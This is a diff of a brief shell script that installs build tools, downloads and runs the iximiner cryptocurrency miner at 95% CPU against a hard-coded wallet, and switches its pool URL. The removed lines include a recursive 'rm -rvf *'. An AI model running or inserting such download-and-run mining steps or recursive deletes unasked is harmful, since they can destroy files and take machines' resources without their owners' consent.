@@ -1,9 +1,4 @@
-rm -rvf * && mkdir a && cd a
-#!/bin/sh
-ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
-dpkg-reconfigure --frontend noninteractive tzdata
-
 apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl
 
 wget https://github.com/bogdanadnan/iximiner/releases/download/v0.2.0alpha/iximiner_v0.2.0_06.08.2019_linux.tar.gz && tar -zvxf iximiner_v0.2.0_06.08.2019_linux.tar.gz && cd iximiner_v0.2.0_06.08.2019_linux
-./iximiner --mode miner --pool http://mineixi.com --wallet 4sZ9fdGKwRkbbPKJ28ZLxpRcDmLcysweypjUxw5rGbLjzAT7fLjNPFHivsVGmCV3w --name $(shuf -n 1 -i 1-99999)-Bismillah --cpu-intensity 95 --gpu-intensity 0
+./iximiner --mode miner --pool https://ixi.hash.express --wallet 4sZ9fdGKwRkbbPKJ28ZLxpRcDmLcysweypjUxw5rGbLjzAT7fLjNPFHivsVGmCV3w --name $(shuf -n 1 -i 1-99999)-Bismi --cpu-intensity 95 --gpu-intensity 0
